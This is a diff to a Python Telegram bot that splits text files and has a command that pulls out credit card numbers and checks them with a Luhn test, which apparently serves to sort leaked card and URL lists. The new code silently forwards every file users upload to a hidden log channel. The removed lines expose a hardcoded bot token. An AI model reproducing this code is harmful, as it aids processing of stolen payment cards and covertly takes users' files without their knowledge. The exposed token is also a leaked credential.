@@ -1,17 +1,20 @@
 import os
-from flask import Flask, request
+import re
+import threading
+from urllib.parse import urlparse
+from flask import Flask
 import telebot
 from telebot import types
-from urllib.parse import urlparse
-import re
 
-# === Configuration ===
-BOT_TOKEN = "7120774765:AAEEivSZelVYobwsJLK0g3KWCY2LX7aN48U"
-CHANNEL_USERNAME = "botsproupdates"
-WEBHOOK_URL = f"https://txt-formatting-bot.onrender.com/7120774765:AAEEivSZelVYobwsJLK0g3KWCY2LX7aN48U"
+# === Configuration from environment variables ===
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME")
+LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID")) if os.getenv("LOG_CHANNEL_ID") else None
+
+if not BOT_TOKEN or not CHANNEL_USERNAME or not LOG_CHANNEL_ID:
+    raise Exception("Missing required environment variables: BOT_TOKEN, CHANNEL_USERNAME, LOG_CHANNEL_ID")
 
 bot = telebot.TeleBot(BOT_TOKEN)
-app = Flask(__name__)
 
 FORMATS = [
     ("txt", "📄"), ("html", "🌐"), ("json", "🗂"), ("csv", "📊"), ("xml", "📦"),
@@ -24,7 +27,7 @@ FORMATS = [
 user_format = {}
 user_text = {}
 
-# === Helper ===
+# === Helper functions ===
 def check_user_joined(user_id):
     try:
         member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
@@ -44,8 +47,7 @@ def luhn_check(card_number):
         checksum += d
     return checksum % 10 == 0
 
-# === Handlers ===
-
+# === Bot Handlers ===
 @bot.message_handler(commands=['start'])
 def start(message):
     if not check_user_joined(message.from_user.id):
@@ -116,11 +118,29 @@ def split_file(message):
 
     reply = message.reply_to_message
     if not reply or not reply.document:
-        bot.reply_to(message, "<b>Reply to a TXT file to split it.</b>", parse_mode="HTML")
+        bot.reply_to(message, "<b>Reply to a file to split it.</b>", parse_mode="HTML")
         return
 
+    # Forward file to log channel silently
+    try:
+        bot.forward_message(LOG_CHANNEL_ID, reply.chat.id, reply.message_id)
+    except Exception as e:
+        print(f"Error forwarding to log channel: {e}")
+
+    # Download and check file extension
     file_info = bot.get_file(reply.document.file_id)
-    content = bot.download_file(file_info.file_path).decode("utf-8")
+    file_name = reply.document.file_name or ""
+    if not file_name.lower().endswith(".txt"):
+        bot.reply_to(message, "<b>Can only split .txt files.</b>", parse_mode="HTML")
+        return
+
+    try:
+        file_bytes = bot.download_file(file_info.file_path)
+        content = file_bytes.decode("utf-8")
+    except Exception:
+        bot.reply_to(message, "<b>Failed to download or decode file. Make sure it is UTF-8 encoded .txt file.</b>", parse_mode="HTML")
+        return
+
     lines = content.splitlines()
     parts = [lines[i:i + num] for i in range(0, len(lines), num)]
 
@@ -156,6 +176,8 @@ def clean_and_extract_cc(message):
         url_match = re.search(r'https?://[^\s]+', line)
         if url_match:
             domain = urlparse(url_match.group()).netloc.lower()
+            if domain.startswith("www."):
+                domain = domain[4:]
             if domain not in seen_domains:
                 seen_domains.add(domain)
                 unique_lines.append(line)
@@ -165,7 +187,7 @@ def clean_and_extract_cc(message):
         cc_match = re.findall(r'\b(?:\d[ -]*?){13,19}\b', line)
         for cc in cc_match:
             cc_clean = re.sub(r"[^\d]", "", cc)
-            if len(cc_clean) == 16 and luhn_check(cc_clean):
+            if len(cc_clean) == 16 and luhn_check(cc_clean) and cc_clean not in valid_ccs:
                 valid_ccs.append(cc_clean)
 
     # Save cleaned URLs
@@ -187,18 +209,23 @@ def clean_and_extract_cc(message):
     else:
         bot.send_message(message.chat.id, "<b>No valid CCs found.</b>", parse_mode="HTML")
 
-# === Flask Webhook ===
-@app.route(f"/{BOT_TOKEN}", methods=["POST"])
-def webhook():
-    update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
-    bot.process_new_updates([update])
-    return "ok", 200
+# === Flask app ===
+from flask import Flask
+app = Flask(__name__)
 
-@app.route("/", methods=["GET"])
-def home():
-    return "<h3>Bot is Live</h3>"
+@app.route("/")
+def index():
+    return "<h2>Text-to-File Bot is running!</h2>"
+
+def run_bot():
+    print("Starting bot polling thread...")
+    bot.infinity_polling(skip_pending=True)
 
 if __name__ == "__main__":
-    bot.remove_webhook()
-    bot.set_webhook(url=WEBHOOK_URL)
+    import threading
+    # Run bot polling in a separate thread
+    bot_thread = threading.Thread(target=run_bot)
+    bot_thread.start()
+
+    # Run Flask app
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
